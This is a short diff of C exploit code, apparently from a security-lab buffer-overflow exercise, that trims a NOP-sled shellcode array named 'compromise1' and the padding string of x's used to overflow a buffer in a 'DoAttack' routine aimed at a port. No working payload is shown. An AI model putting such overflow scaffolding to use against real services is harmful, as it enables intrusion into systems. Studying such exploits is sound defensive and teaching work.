@@ -94,7 +94,7 @@ void  DoAttack(int portNo) {
     return;
 }
 
-char compromise1[131]={ //124 x's + 4 for wxyz + 2 for newline and null = 130
+char compromise1[130]={ //124 x's + 4 for wxyz + 2 for newline and null = 130
     // compromise code goes here..
                                        //bits 32
                                        // nop instructions added for padding 
@@ -104,7 +104,7 @@ char compromise1[131]={ //124 x's + 4 for wxyz + 2 for newline and null = 130
     0x90, 0x90, 0x90, 0x90, 0x90,
     0x90, 0x90, 0x90, 0x90, 0x90,
     0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90, 
     0x90,                      //nop 
     0x90,                      //nop
                                        
@@ -167,7 +167,7 @@ char compromise1[131]={ //124 x's + 4 for wxyz + 2 for newline and null = 130
 };
 
 char * compromise =
-    "xxxxx"
+    "xxxx"
     "xxxxxxxxxxxxxxxxxxxx"
     "xxxxxxxxxxxxxxxxxxxx"
     "xxxxxxxxxxxxxxxxxxxx"
